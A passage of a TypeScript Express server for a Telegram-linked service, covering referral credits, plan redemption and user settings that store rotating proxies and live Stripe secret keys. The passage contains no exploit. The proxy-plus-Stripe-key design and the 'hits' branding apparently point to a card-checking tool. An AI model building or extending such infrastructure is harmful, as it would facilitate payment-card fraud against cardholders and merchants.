    const data = loadReferrals();
    const entry = getReferralEntry(data, userId);
    // Persist so this user's referral code is recognised when someone applies it,
    // even if they have never used the Telegram bot (/start) directly.
    saveReferrals(data);
    const host = req.headers.host || "jayhits.app";
    const proto = req.headers["x-forwarded-proto"] || "https";
    const baseUrl = `${proto}://${host}`;
    res.json({
      code: getReferralCode(userId),
      link: `${baseUrl}/?ref=${getReferralCode(userId)}`,
      balance: entry.balance,
      totalEarned: entry.totalEarned,
      referredCount: entry.referredCount,
      redeemedHistory: entry.redeemedHistory,
    });
  });

  // POST /api/referral/apply — apply a referral code for the logged-in user (called once after first login)
  app.post("/api/referral/apply", requireAuth, async (req, res) => {
    const userId = req.session!.userId;
    const { code } = req.body;
    if (!code || typeof code !== "string") {
      return res.status(400).json({ error: "Missing referral code" });
    }

    const upperCode = code.trim().toUpperCase();
    if (!/^REF\d{5,15}$/.test(upperCode)) {
      return res.status(400).json({ error: "Invalid referral code format" });
    }

    const referrerId = upperCode.slice(3); // strip "REF"

    if (referrerId === userId) {
      return res.status(400).json({ error: "You cannot refer yourself" });
    }

    // Check referrer is a known user — look in users.json (bot users), referrals.json
    // (web users who viewed their referral page), and user_tiers.json (paid users).
    const usersFile = path.join(path.resolve(process.cwd(), "bot"), "users.json");
    const tiersFile = path.join(path.resolve(process.cwd(), "bot"), "user_tiers.json");
    let knownUsers: Record<string, any> = {};
    let knownTiers: Record<string, any> = {};
    try { knownUsers = JSON.parse(fs.readFileSync(usersFile, "utf-8")); } catch {}
    try { knownTiers = JSON.parse(fs.readFileSync(tiersFile, "utf-8")); } catch {}
    const refData = loadReferrals();
    const isKnownReferrer = !!(knownUsers[referrerId] || refData.users[referrerId] || knownTiers[referrerId]);
    if (!isKnownReferrer) {
      return res.status(404).json({ error: "Referral code does not belong to a known user" });
    }

    // ── Channel & Group membership check ────────────────────────────────────
    if (!isAdminUser(userId)) {
      try {
        const botDir = path.resolve(process.cwd(), "bot");
        const checkScript = path.join(botDir, "check_member.py");
        const pythonPath = process.env.PYTHON_PATH || "python3";
        const memberResult = await new Promise<string>((resolve) => {
          execFile(pythonPath, [checkScript, userId], { timeout: 12000, cwd: botDir }, (_err: any, stdout: string) => {
            resolve(stdout?.trim() || '{"member":false,"status":"error"}');
          });
        });
        const parsed = JSON.parse(memberResult);
        if (!parsed.member) {
          const { groupLink, channelLink } = getMembershipLinks();
          const statusMsg: Record<string, string> = {
            not_in_group_or_channel: "You must join our Channel and Group first.",
            not_in_group: "You must join our Group first.",
            not_in_channel: "You must join our Channel first.",
          };
          return res.status(403).json({
            error: statusMsg[parsed.status] || "You must join our Channel and Group to use referral codes.",
            requiresMembership: true,
            groupLink,
            channelLink,
          });
        }
      } catch {
        // If check fails, allow through to not break legitimate users
      }
    }
    // ── End membership check ─────────────────────────────────────────────────


    const data = loadReferrals();

    // Check if this user was already referred
    if (data.usedBy[userId]) {
      return res.status(400).json({ error: "You have already used a referral code" });
    }

    // ── IP Anti-Abuse ───────────────────────────────────────────────────────
    const ip = getClientIp(req);
    const MAX_REFERRALS_PER_IP = 2; // max accounts allowed to apply a referral from same IP

    if (ip !== "unknown" && ip !== "::1" && ip !== "127.0.0.1") {
      if (!data.ipUsed) data.ipUsed = {};
      const ipEntries = data.ipUsed[ip] || [];

      if (ipEntries.length >= MAX_REFERRALS_PER_IP) {
        return res.status(403).json({
          error: "Referral rejected: too many accounts registered from this IP address.",
        });
      }
    }
    // ── End IP Anti-Abuse ───────────────────────────────────────────────────

    // ── New user account age check ──────────────────────────────────────────
    const newUserEntry = knownUsers[userId];
    if (newUserEntry?.joined_at) {
      const joined = new Date(newUserEntry.joined_at).getTime();
      const ageDays = Math.floor((Date.now() - joined) / 86400000);
      if (ageDays < 3 && !isAdminUser(userId)) {
        return res.status(403).json({
          error: `Your account must be at least 3 days old to use a referral code. Come back in ${3 - ageDays} day(s).`,
        });
      }
    }
    // ── End new user age check ──────────────────────────────────────────────

    // Credit referrer
    const entry = getReferralEntry(data, referrerId);
    entry.balance = Math.round((entry.balance + 0.30) * 100) / 100;
    entry.totalEarned = Math.round((entry.totalEarned + 0.30) * 100) / 100;
    entry.referredCount += 1;
    entry.referredUsers.push(userId);
    data.usedBy[userId] = referrerId;

    // Record IP for this application
    if (ip !== "unknown" && ip !== "::1" && ip !== "127.0.0.1") {
      if (!data.ipUsed) data.ipUsed = {};
      if (!data.ipUsed[ip]) data.ipUsed[ip] = [];
      data.ipUsed[ip].push(userId);
    }

    saveReferrals(data);
    res.json({ success: true, message: "Referral applied! Your referrer earned $0.30" });
  });

  // POST /api/referral/redeem — redeem balance for a plan
  app.post("/api/referral/redeem", requireAuth, async (req, res) => {
    const userId = req.session!.userId;
    const sessionAny = req.session as any;
    const userName = [sessionAny?.firstName, sessionAny?.lastName].filter(Boolean).join(" ") || sessionAny?.username || userId;
    const { plan } = req.body;

    if (!plan || !["silver", "gold"].includes(plan)) {
      return res.status(400).json({ error: "Invalid plan. Choose silver or gold." });
    }

    const planCost = plan === "silver" ? 5 : 7;
    const days = 7;

    const data = loadReferrals();
    const entry = getReferralEntry(data, userId);

    if (entry.balance < planCost) {
      return res.status(400).json({
        error: `Insufficient balance. You need $${planCost} for ${plan} plan. Current balance: $${entry.balance.toFixed(2)}`,
      });
    }

    // Check if user already has an active higher/same plan
    const currentTier = getUserTier(userId);
    const tierRank: Record<string, number> = { free: 0, silver: 1, gold: 2 };
    if (currentTier !== "free") {
      const tiers = loadUserTiers();
      const tierEntry = tiers[userId];
      const expiresAt = tierEntry?.expiresAt ? new Date(tierEntry.expiresAt) : null;
      const isActive = expiresAt && expiresAt.getTime() > Date.now();
      if (isActive && tierRank[currentTier] > tierRank[plan]) {
        return res.status(400).json({ error: `You already have a higher plan (${currentTier}).` });
      }
      if (isActive && tierRank[currentTier] === tierRank[plan]) {
        const daysLeft = Math.ceil((expiresAt!.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
        return res.status(400).json({ error: `You already have an active ${currentTier} plan (${daysLeft} day${daysLeft !== 1 ? "s" : ""} left).` });
      }
    }

    // Deduct balance
    entry.balance = Math.round((entry.balance - planCost) * 100) / 100;
    entry.redeemedHistory.push({ plan, amount: planCost, redeemedAt: new Date().toISOString() });
    saveReferrals(data);

    // Activate the plan
    const expiresAt = new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString();
    const tiers = loadUserTiers();
    tiers[userId] = { tier: plan as UserTier, assignedBy: "referral_redeem", assignedAt: new Date().toISOString(), expiresAt, days } as any;
    saveUserTiers(tiers);

    // Update premium.json for bot compatibility
    const premiumFilePath = path.join(path.resolve(process.cwd(), "bot"), "premium.json");
    try {
      let premiumData: Record<string, any> = {};
      if (fs.existsSync(premiumFilePath)) premiumData = JSON.parse(fs.readFileSync(premiumFilePath, "utf-8"));
      premiumData[userId] = { expiry: expiresAt, added_by: "referral_redeem", days };
      fs.writeFileSync(premiumFilePath, JSON.stringify(premiumData, null, 2));
      debouncedSaveJson();
    } catch {}

    // Notify user via bot
    const pythonPath = process.env.PYTHON_PATH || "python3";
    const botDir = path.resolve(process.cwd(), "bot");
    execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "invoice", userId, plan, String(days), "REFERRAL_BALANCE"], { timeout: 15000 }, () => {});
    execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "log", userId, userName, plan, String(days)], { timeout: 15000 }, () => {});

    res.json({ success: true, plan, days, expiresAt, remainingBalance: entry.balance, message: `${plan.charAt(0).toUpperCase() + plan.slice(1)} plan activated for ${days} days!` });
  });
  // ── End Referral Program ───────────────────────────────────────────────────

  app.get("/api/user/settings", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const proxies = loadUserProxies();
      const skKeys = loadSkKeys();
      res.json({
        proxies: proxies[userId]?.proxies || [],
        skKeys: skKeys[userId] || [],
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/user/settings/proxy", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const { proxy } = req.body;
      if (!proxy || typeof proxy !== "string" || proxy.trim().length < 5) {
        return res.status(400).json({ error: "Invalid proxy" });
      }

      const raw = proxy.trim();
      const validateScript = path.join(path.resolve(process.cwd(), "bot"), "web_validate_proxy.py");
      const output = await runPythonScript(validateScript, ["format_check", raw], path.resolve(process.cwd(), "bot"));
      const validation = parseLastJson(output);
      if (!validation.valid) {
        return res.status(400).json({ error: validation.error || "Invalid proxy format" });
      }

      const data = loadUserProxies();
      if (!data[userId]) data[userId] = { proxies: [] };
      if (data[userId].proxies.includes(raw)) {
        return res.status(400).json({ error: "Proxy already exists" });
      }
      if (data[userId].proxies.length >= 20) {
        return res.status(400).json({ error: "Max 20 proxies allowed" });
      }
      data[userId].proxies.push(raw);
      saveUserProxies(data);
      res.json({ success: true, proxies: data[userId].proxies });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/user/settings/proxy/bulk", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const { proxies } = req.body;
      if (!proxies || typeof proxies !== "string") {
        return res.status(400).json({ error: "Provide proxies as text (one per line)" });
      }

      const lines = proxies.split("\n").map((l: string) => l.trim()).filter((l: string) => l.length >= 5);
      if (lines.length === 0) {
        return res.status(400).json({ error: "No valid proxies found" });
      }

      const data = loadUserProxies();
      if (!data[userId]) data[userId] = { proxies: [] };

      const existing = new Set(data[userId].proxies);
      const maxSlots = 20 - data[userId].proxies.length;
      if (maxSlots <= 0) {
        return res.status(400).json({ error: "Proxy limit reached (20 max)" });
      }

      const validateScript = path.join(path.resolve(process.cwd(), "bot"), "web_validate_proxy.py");
      let added = 0;
      let skipped = 0;
      let invalid = 0;

      for (const raw of lines) {
        if (added >= maxSlots) break;
        if (existing.has(raw)) { skipped++; continue; }

        try {
          const output = await runPythonScript(validateScript, ["format_check", raw], path.resolve(process.cwd(), "bot"));
          const validation = parseLastJson(output);
          if (validation.valid) {
            data[userId].proxies.push(raw);
            existing.add(raw);
            added++;
          } else {
            invalid++;
          }
        } catch {
          invalid++;
        }
      }

      saveUserProxies(data);
      res.json({
        success: true,
        added,
        skipped,
        invalid,
        total: data[userId].proxies.length,
        proxies: data[userId].proxies,
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/user/settings/proxy", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const { proxy } = req.body;
      if (!proxy) return res.status(400).json({ error: "Proxy required" });

      const data = loadUserProxies();
      if (!data[userId]) return res.json({ success: true, proxies: [] });
      data[userId].proxies = data[userId].proxies.filter((p: string) => p !== proxy);
      if (data[userId].proxies.length === 0) delete data[userId];
      saveUserProxies(data);
      res.json({ success: true, proxies: data[userId]?.proxies || [] });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/user/settings/proxy/all", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const data = loadUserProxies();
      if (data[userId]) {
        delete data[userId];
        saveUserProxies(data);
      }
      res.json({ success: true, proxies: [] });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/user/settings/proxy/validate", requireAuth, async (req, res) => {
    try {
      const { proxy } = req.body;
      if (!proxy || typeof proxy !== "string") {
        return res.status(400).json({ error: "Proxy required" });
      }
      const validateScript = path.join(path.resolve(process.cwd(), "bot"), "web_validate_proxy.py");
      const output = await runPythonScript(validateScript, ["validate", proxy.trim()], path.resolve(process.cwd(), "bot"), 20000);
      const result = parseLastJson(output);
      res.json(result);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // GET /api/user/settings/proxy/status — test the user's currently active proxy
  app.get("/api/user/settings/proxy/status", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const proxyData = loadUserProxies();
      const userProxies: string[] = proxyData[userId]?.proxies || [];
      if (userProxies.length === 0) {
        return res.json({ hasProxy: false, alive: null, proxy: null, message: "No proxy set" });
      }
      const proxy = userProxies[0];
      try {
        const validateScript = path.join(path.resolve(process.cwd(), "bot"), "web_validate_proxy.py");
        const output = await runPythonScript(validateScript, ["validate", proxy], path.resolve(process.cwd(), "bot"), 15000);
        const result = parseLastJson(output);
        const alive = result.valid === true && result.tested === true;
        return res.json({ hasProxy: true, alive, proxy: proxy.split("@").pop() || proxy, message: alive ? "Proxy is working" : (result.error || "Proxy appears dead") });
      } catch {
        return res.json({ hasProxy: true, alive: false, proxy: proxy.split("@").pop() || proxy, message: "Could not reach proxy" });
      }
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/user/settings/sk", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const { sk } = req.body;
      if (!sk || typeof sk !== "string") {
        return res.status(400).json({ error: "SK key required" });
      }
      const skClean = sk.trim();
      if (!/^(sk_live_|sk_test_|rk_live_|rk_test_)\w{10,}$/.test(skClean)) {
        return res.status(400).json({ error: "Invalid SK format. Must start with sk_live_, sk_test_, rk_live_, or rk_test_" });
      }

      const data = loadSkKeys();
      if (!data[userId]) data[userId] = [];
      if (data[userId].includes(skClean)) {
        return res.status(400).json({ error: "SK key already exists" });
      }
      if (data[userId].length >= 10) {
        return res.status(400).json({ error: "Max 10 SK keys allowed" });
      }
      data[userId].push(skClean);
      saveSkKeys(data);
      res.json({ success: true, skKeys: data[userId] });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/user/settings/sk", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const { sk } = req.body;
      if (!sk) return res.status(400).json({ error: "SK key required" });

      const data = loadSkKeys();
      if (!data[userId]) return res.json({ success: true, skKeys: [] });
      data[userId] = data[userId].filter((k: string) => k !== sk);
      if (data[userId].length === 0) delete data[userId];
      saveSkKeys(data);
      res.json({ success: true, skKeys: data[userId] || [] });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  return httpServer;
}
